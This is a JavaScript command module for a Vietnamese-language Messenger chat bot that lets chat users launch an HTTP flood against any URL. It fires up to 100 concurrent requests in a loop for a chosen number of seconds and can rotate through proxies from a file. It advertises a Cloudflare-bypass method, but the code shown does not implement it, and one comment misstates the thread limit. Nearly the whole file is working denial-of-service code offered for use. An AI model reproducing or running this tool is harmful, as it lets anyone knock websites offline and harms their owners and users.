const axios = require("axios");
const fs = require("fs");
const path = require("path");
const HttpsProxyAgent = require("https-proxy-agent");

module.exports.config = {
    name: "sent",
    version: "1.7.1",
    hasPermission: 0,
    credits: "Vincent",
    description: "Tấn công bằng nhiều phương thức",
    commandCategory: "Hệ thống",
    cooldowns: 10
};

const PROXY_FILE_PATH = "./../../pdata/data_dongdev/proxy.txt";
const ADMIN_IDS = ["100047128875560"]; // Thay bằng ID admin bot của bạn
const requestQueue = [];

module.exports.run = async function ({ api, event, args }) {
    const { threadID, messageID, senderID } = event;
    const isAdmin = ADMIN_IDS.includes(senderID);

    if (!args[0] || !args[1] || !args[2]) {
        return api.sendMessage(
            "📌 Vui lòng nhập đúng lệnh:\n" +
            "  .sent [phương thức] [URL] [time]\n\n" +
            "📌 Danh sách phương thức:\n" +
            "  - flood   → Gửi request trực tiếp\n" +
            "  - bypass  → Bypass Cloudflare JS Challenge\n" +
            "  - http    → Gửi request qua proxy HTTP/SOCKS\n" +
            "  - tsunami → Tấn công với tốc độ cao nhất\n",
            threadID, messageID
        );
    }

    const method = args[0].toLowerCase();
    const targetUrl = args[1];
    let attackTime = parseInt(args[2]) * 1000;
    const threads = Math.min(100, 1000); // ✅ Giới hạn threads tối đa là 10

    if (!isAdmin && attackTime > 60000) {
        return api.sendMessage("⛔ Bạn chỉ có thể tấn công tối đa 60 giây!", threadID, messageID);
    }

    const validMethods = ["flood", "bypass", "http", "tsunami"];
    if (!validMethods.includes(method)) {
        return api.sendMessage("⚠️ Phương thức không hợp lệ! Nhập `.sent` để xem hướng dẫn.", threadID, messageID);
    }

    // ✅ Đọc proxy từ file proxy.txt
    const proxies = loadProxies();
    const useProxy = method === "http" && proxies.length > 0;

    requestQueue.push({ method, targetUrl, attackTime, threads, useProxy, proxies, event });
    api.sendMessage(`🕒 Yêu cầu đã được thêm vào hàng chờ. Hiện có **${requestQueue.length}** yêu cầu đang chờ xử lý.`, threadID);

    if (requestQueue.length === 1) {
        processQueue(api);
    }
};

// ✅ Hàm đọc proxy từ file proxy.txt
const loadProxies = () => {
    if (fs.existsSync(PROXY_FILE_PATH)) {
        return fs.readFileSync(PROXY_FILE_PATH, "utf-8").split("\n").map(p => p.trim()).filter(p => p);
    }
    return [];
};

// ✅ Xử lý hàng chờ request (Chống Lag)
const processQueue = async (api) => {
    while (requestQueue.length > 0) {
        const { method, targetUrl, attackTime, threads, useProxy, proxies, event } = requestQueue[0];

        let completedRequests = 0;
        let failedRequests = 0;

        api.sendMessage(`🚀 Bắt đầu tấn công ${targetUrl} bằng phương thức ${method.toUpperCase()}...`, event.threadID);

        const startTime = Date.now();
        while (Date.now() - startTime < attackTime) {
            await Promise.all(
                Array.from({ length: threads }).map(async () => {
                    try {
                        await sendRequest(targetUrl, method, useProxy ? getRandomProxy(proxies) : null);
                        completedRequests++;
                    } catch {
                        failedRequests++;
                    }
                })
            );
        }

        api.sendMessage(`✅ Hoàn thành: ${completedRequests} thành công, ${failedRequests} thất bại.`, event.threadID);
        requestQueue.shift();
    }
};

// ✅ Chọn proxy ngẫu nhiên
const getRandomProxy = (proxies) => {
    return proxies.length > 0 ? `http://${proxies[Math.floor(Math.random() * proxies.length)]}` : null;
};

// ✅ Gửi request theo phương thức (Chống Lag)
const sendRequest = async (targetUrl, method, proxyUrl) => {
    const agent = proxyUrl ? new HttpsProxyAgent(proxyUrl) : null;

    try {
        await axios.get(targetUrl, {
            httpsAgent: agent,
            proxy: false,
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Referer": targetUrl,
            },
        });
    } catch (error) {
        throw new Error(error.message);
    }
};